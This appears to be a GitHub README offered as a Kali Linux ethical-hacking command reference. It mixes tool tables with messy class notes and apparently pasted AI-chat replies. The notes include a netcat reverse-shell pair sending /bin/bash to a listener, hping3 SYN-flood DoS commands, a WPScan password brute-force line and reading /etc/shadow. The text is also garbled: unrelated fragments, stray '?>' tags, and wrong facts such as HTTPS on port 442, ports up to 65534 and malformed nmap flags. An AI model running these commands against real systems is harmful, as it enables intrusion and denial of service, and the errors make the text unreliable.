# Kali Linux Ethical Hacking Commands
This repository is a structured and practical reference of Kali Linux commands and tools used in ethical hacking and penetration testing. It is designed to help cybersecurity learners, bug bounty hunters, and penetration testers understand what each command does, how it works internally, and where it fits in the real-world hacking methodology.

The repository covers core areas such as information gathering (OSINT), network scanning, enumeration, web application security testing, password auditing, wireless security testing, exploitation frameworks, and post-exploitation analysis using Kali Linux.

All commands are documented with clear explanations and safe example usage, focusing on authorized security testing, learning, and professional penetration testing workflows.

## Kali Linux Ethical Hacking Command Structure

**kali-ethical-hacking-commands/**
* ├── [01-basics](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/01-linux-basics/)
* * [File System](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/blob/main/01-linux-basics/file-system.md#linux-file-system-basics-for-ethical-hackers)
* * [Permissions](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/blob/main/01-linux-basics/permissions.md#linux-file-permissions--ownership-security-critical)
* * [Grep Command](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/blob/main/01-linux-basics/grep-command.md#-grep--basic-theory-put-this-at-the-top-of-grep-commandmd)
* * [Find vs Grep](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/blob/main/01-linux-basics/find-vs-grep.md#-find-vs-grep--deep-comparison)
* * [ripgrep.md](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands/blob/main/01-linux-basics/ripgrep.md#-ripgrep-rg--modern-grep-alternative)
* ├── [02-networking](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#2-network-fundamentals)
* ├── [03-reconnaissance](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#3-information-gathering-reconnaissance)
* ├── [04-scanning](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#4-scanning--enumeration)
* ├── [05-web-testing](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#5-web-application-testing)
* ├── [06-passwords](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#6-password--authentication-testing)
* ├── [07-wireless](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#7-wireless-security-authorized-only)
* ├── [08-exploitation](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#8-exploitation-frameworks)
* ├── [09-post-exploitation](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#9-post-exploitation-high-level)
* └── [10-reporting](https://github.com/MdJahidShah/kali-linux-ethical-hacking-commands?tab=readme-ov-file#10-reporting--evidence)

Let’s pressure-test the request first.

**Blind spot:** “All estimated commands of Kali Linux” is not a real or useful target. Kali has **thousands** of binaries, and most ethical hackers don’t operate by memorizing commands — they operate by **methodology** (recon → enumeration → exploitation → post-exploitation → reporting).
If you dump everything, your GitHub repo will look noisy and amateur.

**Better strategic move:** Create a **curated, professional command reference**, organized by **ethical hacking phases**, with:

* What the tool/command does
* How it works (high-level, not exploit walkthroughs)
* Example syntax (safe, non-targeted)

Here in the below, there are some most usefull **Kali Linux** Command listed with a few details information. This is the *80/20* set used by real pentesters.

---

## Kali Linux Ethical Hacking Command Reference

---

## 1. System & Environment Basics

> Foundation every hacker must master

You’re right to normalize this — mixed formats kill readability and repo credibility. Below is your content **cleaned, standardized, and converted into a single professional Markdown table** you can drop directly into GitHub.

I’ve also corrected command inaccuracies and tightened the “How it works” column so it’s technically sound.

---

### 📌 Basic Kali Linux Commands (Formatted Table)

| Command              | Description                 | How it works                                 |
| -------------------- | --------------------------- | -------------------------------------------- |
| `Ctrl + Alt + T`     | Open Terminal               | Launches the default terminal emulator       |
| `history`            | Display command history     | Reads shell command history from memory/file |
| `ls`                 | List files/directories      | Reads directory inode table                  |
| `ls -la`             | List all files with details | Shows permissions, owner, size, hidden files |
| `cd directoryname`   | Enter a directory           | Changes current working directory            |
| `cd ..`              | Go back one directory       | Moves to parent directory                    |
| `cd /`               | Go to root directory        | Switches to filesystem root                  |
| `cd /var/www/html`   | Change to specific path     | Navigates using absolute path                |
| `pwd`                | Show current path           | Prints absolute working directory            |
| `cp file.txt /tmp/`  | Copy file                   | Duplicates file to target location           |
| `cp -r folder /tmp/` | Copy directory              | Recursively copies directory contents        |
| `mv old.txt new.txt` | Move or rename file         | Updates file location or name                |
| `rm file.txt`        | Remove file                 | Deletes file reference                       |
| `rm -rf test/`       | Force delete directory      | Recursively removes files without prompt     |
| `cat /etc/passwd`    | Read file contents          | Outputs file data to terminal                |
| `nano config.txt`    | Edit file (Nano)            | Opens file in terminal text editor           |
| `vim config.txt`     | Edit file (Vim)             | Opens file in Vim editor                     |
| `touch hello.txt`    | Create empty file           | Updates file timestamp / creates file        |
| `mkdir myfolder`     | Create directory            | Allocates new directory inode                |
| `tree -L 2`          | Display directory tree      | Visualizes directory hierarchy up to level 2 |
| `clear`              | Clear the terminal          |                                              |

---

Ping Command
ping google.com

Update
Sudo apt update

Upgrade
sudo apt upgrade -y

To Clear
clear



To display my router IP
curl ifconfig.me

IP Check:
---------
ifconfig website_url/IP
host website_url

Password contain inside "etc"filder
To Display user and Password
cat etc/passwd

To display super user
sudo cat etc/shadow

To search command or anything in any file.
grep "nmap" commands.txt


------------------------------------
NMAP
====================================
Types of IP:
------------
1. Public
2. Private
3. Dynamic
4. Static

Port:
-----
Logical endpoint for communication.
Range: 0 to 65534
-> 0-1023: well-known (HTTP:80, HTTPS:443, SSH:22)
-> 1024 - 49151: Registered
-> 49152-65535: Dynamic/Private

Here an example,
Building number is the IP address,
Flat number is the MAC Address, and 
Port is the room number.

Simply to say, an IP address contain many MAC, and a MAC contain many Ports.

Protocol - Port - 	Use
HTTP		80		Web Traffic
HTTPS		442		Secure Web
FTP			21		File Transfer
SSH			22		Secure Shell
DNS			53		Domain Name System 
SMTP		25		Email Sending

Tool like Nmap use ports for Scanning

Port Scanning:
--------------------------
nmap -p 22,21 192.168.0.1

Version Check:
--------------------------
nmap isV 192.168.0.1

Culnerability Check:
-----------------------------
nmap -script vuln 192.168.0.1




Website Missconfiguration check using NMAP:
-------------------------------------------
1. nmap website_IP

2. To check what vulnerability in which port, mainly display "server version".
-> nmap -sS -sV website_IP (-sV = Service Version, )
Now check any exploit is there for the shows versions or not.

3. Check port with specification(By default nmap scan 1000 port).
-> nmap -p 1-65535 IP_Address
	nmap -p 1-65535 -sS -sV IP_Address

============================================================
			Reconnaissance and Footptinting
============================================================
Data collection about the target or server before attack.

1. Active and Passive Recon:
If server know that you are collection data from the server or website, it is active. Risk high.
If server/terget can not unserstand anything about data collection is called passive. In this case, mainly use thirdy party resources. Risk low.

2. Whois Lookup (Kali Tools):

whois example.com

DNS check:
----------
nslookup example.com
nslookup -type-NS example.com

dig example.com

Google Dorking:
---------------
site:google.com inurl:admin

**Google Hacking Database (in linux firefox bookmark, exploit-db.com)**



--------------------------------------------------------
		NetCat /socat -h (reverseShell)
========================================================
nc -lvnp 444
here,
	l = listen mode
	v = verbose
	n = Numeric
	p = Port Number
	e = exect file Name
	k = keep alive

to chat with other device-
- Attacker pc (port must be minimum 4 digit)
-------------
- nc -lvnp 4444

- victim mc
--------------
- nc 192.168.8.1 4444
if victim just run this command in his pc, attacker will able to chat.

-> nc -zv 192.168.1.1 1-1000	-> Port Scan
-> nc 192.168.1.1 80	-> Connect a web server
-> lc -lvnp 4444	-> Listen for a revers Shell 
-> nc 192.168.1.1 4444 -e /bin/bash		-> Send reverseShell
-> nc -i -p 1234 > received.txt		-> File Send 
-> nc 192.168.1.1 1234 >file.txt	-> File Receive 
-> nc -i -p 1234	-> Both end run this to connect chat to each other.
-> ->->->->->->->->->->->->->->->->->->->->->->->
Attacker 				victim
---------			------------
- nc -lvknp 4444	-> 	nc 192.168.0.1 4444 -ke bin/bash


[* This command use to check any "nc" reverseShell inside the file or not*]
- grep "nc" zphisher.sh
- grep "bin/bash" zphisher.sh



 




--------------------------------------------------------
				DOS Attack:
(Requirment - Must need a Botnet that contain ip)
========================================================
sudo apt install hping3
hping3 --help
sudo hping3 -S --flood -p 80 IP-Address (http website)
sudo hping3 -S --flood -p 433 IP Address (https website)

?>

Linux Command
==============<?
python3 -m venv venv
source venv/bin/activate

Burtforce atk using WPSCAN
wpscan -u https://example.com --wordlist /root/Desktop/rockyou.txt --username techchip
skipfish
skipfish -o Download https://example.com
joomscan


Night hunter
Lost girls and love hotels

QuickScope (for malware analysis)
python qu1cksc0pe.py --db_update
========= Start Scan ============
python qu1cksc0pe.py --file ~Desktop/malware/wannn.exe --hashscan



?>


HW-(class-7)
------------
attack using nmap how many you can in metasploitable



shop.arawsupermarket



To Check Where Our Connection was build:<?
========================================
netstat -aon
tasklist /fi "pid eq 2521"

For mac
----------------
brew install htop
htop (To run) or use top
h for help
t for back


for linux
----------
sudo apt install rkhunter
rkhunter
sudo rkhunter -c (to check anything is warning)

Digital Forensics:
================================================
fdisk -l
hdparm -I /dev/sda

To see the device attached
fdisk -l 
df -h (to see the directory file is mounted)
dc3dd if=/dev/sda hof=/media/root/47BF-5C55/forensics/cases/suspect_hd.img.00 ofsz=3G hash=sha512 log=/media/root/47BF-5C55/forensics/cases/suspect_hd.log
========================================
?>

---

## 2. Network Fundamentals

> Understanding traffic is non-negotiable

| Command          | Description           | How it works                  |
| ---------------- | --------------------- | ----------------------------- |
| `ip a`           | Show interfaces       | Queries kernel network stack  |
| `ip r`           | Routing table         | Displays packet routing paths |
| `ifconfig`       | Legacy interface tool | Manages NIC configuration     |
| `arp -a`         | ARP table             | Maps IP → MAC                 |
| `netstat -tulnp` | Open ports            | Reads kernel socket table     |
| `ss`             | Socket stats          | Faster netstat replacement    |
| `ping`           | Host reachability     | ICMP echo requests            |
| `traceroute`     | Path discovery        | TTL-based hop mapping         |

---

## 3. Information Gathering (Reconnaissance)

> Ethical hacking starts **before** scanning

| Tool / Command     | Purpose                 | How it works                 |
| ------------------ | ----------------------- | ---------------------------- |
| `whois domain.com` | Domain ownership        | Queries WHOIS DB             |
| `dig domain.com`   | DNS records             | Direct DNS resolution        |
| `nslookup`         | DNS queries             | Resolver-based lookup        |
| `theHarvester`     | OSINT emails/subdomains | Search engine scraping       |
| `amass`            | Asset discovery         | Passive + active enumeration |
| `recon-ng`         | Recon framework         | Modular OSINT automation     |

---

## 4. Scanning & Enumeration

> Identifying attack surface

| Tool         | Description       | How it works                    |
| ------------ | ----------------- | ------------------------------- |
| `nmap`       | Network scanner   | TCP/IP probing + fingerprinting |
| `nmap -sV`   | Service detection | Banner & protocol analysis      |
| `nmap -O`    | OS detection      | TCP/IP stack fingerprint        |
| `masscan`    | Fast port scan    | Asynchronous SYN scanning       |
| `enum4linux` | SMB enumeration   | Null session probing            |
| `snmpwalk`   | SNMP enumeration  | OID tree traversal              |

---

## 5. Web Application Testing

> Where most real-world bugs live

| Tool        | Purpose               | How it works                   |
| ----------- | --------------------- | ------------------------------ |
| `whatweb`   | Tech fingerprinting   | HTTP header & content analysis |
| `nikto`     | Web vuln scan         | Signature-based testing        |
| `dirsearch` | Directory brute force | HTTP response analysis         |
| `gobuster`  | Content discovery     | Wordlist-based probing         |
| `wpscan`    | WordPress security    | Plugin/theme CVE checks        |
| `burpsuite` | Web proxy             | Intercepts HTTP requests       |

---

## 6. Password & Authentication Testing

> Controlled credential testing

| Tool      | Description        | How it works           |
| --------- | ------------------ | ---------------------- |
| `hydra`   | Login brute force  | Parallel auth attempts |
| `medusa`  | Password testing   | Threaded login checks  |
| `john`    | Password cracking  | Hash comparison        |
| `hashcat` | GPU cracking       | Optimized hash attacks |
| `crunch`  | Wordlist generator | Pattern-based creation |

---

## 7. Wireless Security (Authorized Only)

> Requires **explicit permission**

| Tool          | Purpose          | How it works       |
| ------------- | ---------------- | ------------------ |
| `iwconfig`    | Wireless setup   | Interface control  |
| `airmon-ng`   | Monitor mode     | Raw packet capture |
| `airodump-ng` | Packet capture   | 802.11 sniffing    |
| `aireplay-ng` | Packet injection | Frame replay       |
| `aircrack-ng` | Key testing      | Handshake analysis |

---

## 8. Exploitation Frameworks

> Proof-of-concept, not destruction

| Tool           | Description           | How it works              |
| -------------- | --------------------- | ------------------------- |
| `msfconsole`   | Metasploit            | Modular exploit framework |
| `searchsploit` | Exploit DB search     | Local exploit database    |
| `sqlmap`       | SQL injection testing | Automated DB probing      |
| `commix`       | Command injection     | Payload automation        |

---

## 9. Post-Exploitation (High-Level)

> Validation, not persistence abuse

| Tool         | Purpose          | How it works         |
| ------------ | ---------------- | -------------------- |
| `linpeas.sh` | Privilege audit  | Misconfig detection  |
| `ps aux`     | Process listing  | Kernel process table |
| `uname -a`   | Kernel info      | OS fingerprint       |
| `sudo -l`    | Permission audit | Allowed commands     |

---

## 10. Reporting & Evidence

> What separates hackers from professionals

| Command       | Purpose          |
| ------------- | ---------------- |
| `script`      | Terminal logging |
| `tee`         | Save output      |
| `markdown`    | Report writing   |
| `screenshots` | Evidence capture |

---

## ⚠️ Disclaimer:  
This repository is intended for educational purposes and authorized security testing only. Do not use these tools or commands on systems you do not own or have explicit permission to test.
